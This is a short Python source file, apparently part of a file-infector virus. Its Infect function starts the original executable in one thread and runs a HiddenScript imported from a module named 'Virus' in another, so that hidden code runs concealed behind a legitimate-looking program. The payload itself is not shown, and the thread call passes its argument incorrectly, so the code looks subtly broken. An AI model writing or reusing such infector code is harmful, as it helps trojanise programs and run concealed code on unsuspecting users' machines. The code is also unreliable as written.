import threading
import os
from Virus import HiddenScript

def OriginalFile(exepath):
    os.startfile(exepath)

def Infect(exepath):
    orgfile = threading.Thread(target=OriginalFile, args=(exepath))
    ViralScript = threading.Thread(target=HiddenScript)
    orgfile.start()
    ViralScript.start()